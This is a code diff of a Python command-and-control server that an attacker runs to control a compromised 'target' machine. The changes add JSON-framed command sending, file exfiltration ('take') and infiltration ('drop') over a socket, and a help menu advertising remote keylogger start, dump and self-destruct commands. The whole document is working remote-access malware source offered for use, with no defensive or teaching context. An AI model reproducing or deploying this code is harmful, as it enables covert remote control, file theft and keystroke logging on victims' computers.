@@ -3,70 +3,69 @@
 import socket
 from termcolor import colored # python coloring library
 import time
-import base64
+import os 
+# Library can be used to change directory by the C2 server owner, after getting a shell back from trgt
+
+import json 
+# The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
 
 
-# Getting a shell
-def shell():
+# Sending whole data all at once
+def send_eff(data):
 
-	global cmd
+	json_data = json.dumps(data)
+	trgt.send(json_data.encode('utf-8')) # encoding data to bytes
+
+# Receiving whole data all at once
+def recv_eff():
+
+	data = ''
 
 	while True:
+		try:
+			data = data + trgt.recv(1024).decode('utf-8').rstrip()# decoding data and striping out EOL spacing
+			return json.loads(data)
 
-		get_username() # getting username for trgt shell from trgt
+		except ValueError:
+			continue
 
-		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
-		trgt.send(cmd.encode("utf-8")) # encoding to binary before sending via socket
+# For uploading files
+def upload_file(file_name):
+
+	file = open(file_name, 'rb')
+
+	trgt.send(file.read())
 
 
-		#shell_cmd() # shell command support
+# For downloading files
+def download_file(file_name):
 
-		if cmd == "exit":  # ✓
-			print(colored("\n[-] Closing connection...", 'yellow'))
-			time.sleep(2)
-			print(colored("[-] Connection Closed\n", 'red'))
+	file = open(file_name, 'wb')
+
+	trgt.settimeout(1)
+
+	# if all file datas are sent and nothing left for download,
+	# the socket will keep on listening, but will not receive
+	# anything, so if now it hangs(keeps on listening) for 1 sec,
+	# while loop will break --> indicating file data transfer is
+	# complete.
+
+	data_small = trgt.recv(1024)
+
+	while data_small:
+
+		file.write(data_small)
+
+		try:
+
+			data_small = trgt.recv(1024)
+
+		except socket.timeout:
+
 			break
 
-
-		# Changing directory  ✓
-		elif cmd[:2] == "cd" and len(cmd) > 1:
-
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-
-
-		# Removing file path in linux  ✓
-		elif cmd[:2] == "rm" and len(cmd) > 1:
-
-			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-
-
-		# Removing file path in Win  ✓
-		elif cmd[:3] == "del" and len(cmd) > 1:
-
-			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-
-		# File download
-		elif cmd[:4] == "take":
-
-			with open(cmd[5:], "wb") as file:
-
-				file_content = trgt.recv(1024000)
-				file.write(base64.b64decode(file_content)) # Incase the file is an image we have to decode with base64 before downloading
-
-		# File upload
-		elif cmd[:4] == "drop":
-			try:
-				with open(cmd[5:], "rb") as file:
-
-					trgt.send(base64.b64encode(file.read())) # Incase the file is an image we have to encode the image with base64 before sending it
-
-			except:
-				fail = "Failed to Upload!!"
-				trgt.send(base64.b64encode(fail))
-
-		else:
-			result = trgt.recv(1024000) # received response in binary format
-			print(result.decode("utf-8")) # decoding response to str format
+	trgt.settimeout(None)
+	file.close()
 
 
 # C2 server function
@@ -88,42 +87,137 @@ def server():
 	print(colored('''
 [+] Listening For Incoming Connections''', 'green'))
 
-	print(colored("[*] To terminate the session, use: 'exit'", 'blue'))
-
-
 	trgt, ip = sock.accept()
 	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
 
+	print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
 
-# shell Command operations
-def shell_cmd():
-	
-	while True:	
-	
+
+# Getting a shell from trgt
+def shell():
+
+	global cmd
+
+	while True:
+
+		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
+		send_eff(cmd)
+
+
+		#shell_cmd() # shell command support
+
 		if cmd == "exit":  # ✓
-			print(colored("\n[-] Closing connection...", 'yellow'))
+			print(colored("\n[*] Closing connection...", 'yellow'))
 			time.sleep(2)
 			print(colored("[-] Connection Closed\n", 'red'))
 			break
+
+		# Help command ✓
+		elif cmd == "help":
+			print(colored('''\n
+
+List of available Commands:
+----------------------------------------------------------------------------------------
+
+exit                          :     To terminate session
+
+clear (linux)                 :     To clear screen
+
+cls (windows)                 :     To clear screen
+
+mkdir <directory> 
+(linux/windows)               :     To make folders
+
+touch <file>
+(linux)                       :     To make files
+
+echo "<something>"            :     To display line of text/string that are passed as an argument
+
+echo "<something>" >/>> file  :     To redirect text to a file, make files
+(linux/windows)
+
+cd <directory>
+(linux/win)                   :     To change directory/folder
+
+rm <file> (linux)             :     To remove files
+
+del <file> (windows)          :     To remove files
+
+take <file> (linux/windows)   :     To exfiltrate file from trgt
+
+drop <file> (linux/windows)   :     To infiltrate file from C2 server to trgt
+
+keylogger on                  :     To start keylogger
+
+keylog dump                   :     To print keystrokes 
+
+keylogger off                 :     To close keylogger and self destruct the logged file
+''', 'green'))
+			print(colored('''
+You can also use other commands related to networking, etc for linux as well as windows
+''','yellow'))
+			print(colored('''
+------------------------------------------------------------------------------------------
+''','green'))
+
+		# Making folder/directory in linux and windows ✓ 
+		elif cmd[:5] == "mkdir" and len(cmd) > 1:
+
+			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+
+		# Making file in linux ✓ 
+		elif cmd[:5] == "touch" and len(cmd) > 1:
+
+			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+
+		# Editing/writing on file on linux and windows ✓ 
+		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>'):
+
+			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt		
+
+		# Appending on file on linux and windows ✓
+		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>>'):
+
+			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+		
+
+		# clearing screen in windows ✓
+		elif cmd[:3] == "cls" and len(cmd) > 1:
+
+			os.system("clear")
 
 		# Changing directory  ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
 
 			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
+
 		# Removing file path in linux  ✓
 		elif cmd[:2] == "rm" and len(cmd) > 1:
 
 			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+
 
 		# Removing file path in Win  ✓
 		elif cmd[:3] == "del" and len(cmd) > 1:
 
 			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
+
+		# Exfiltration in trgt point of view  ✓
+		elif cmd[:4] == "take":
+
+			download_file(cmd[5:])
+
+		# Infiltration in trgt point of view  ✓
+		elif cmd[:4] == "drop":
+		
+			upload_file(cmd[5:])
+
 		else:
-			result = trgt.recv(102400) # received response in binary format
-			print(result.decode("utf-8")) # decoding response to str format
+			result = recv_eff() # received response 
+			print(result)
+
 
 
 # Getting trgt username
@@ -132,18 +226,22 @@ def get_username():
 	global username
 
 	username = "whoami" # to know the username of the trgt
-	trgt.send(username.encode("utf-8"))
+	send_eff(username)
 
 
-	username = trgt.recv(1024) # received response in binary form
-	username = username.decode('utf-8') # decoding to text form
+	username = recv_eff() # received response
 
 	username = username.strip() # Stripping out EOL spacing
+
+	return username
 
 
 def main():
 	server()
-	shell()
+
+	username = get_username() # getting username for making interactive shell from trgt
+
+	shell() # Getting shell for trgt
 	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
 
 
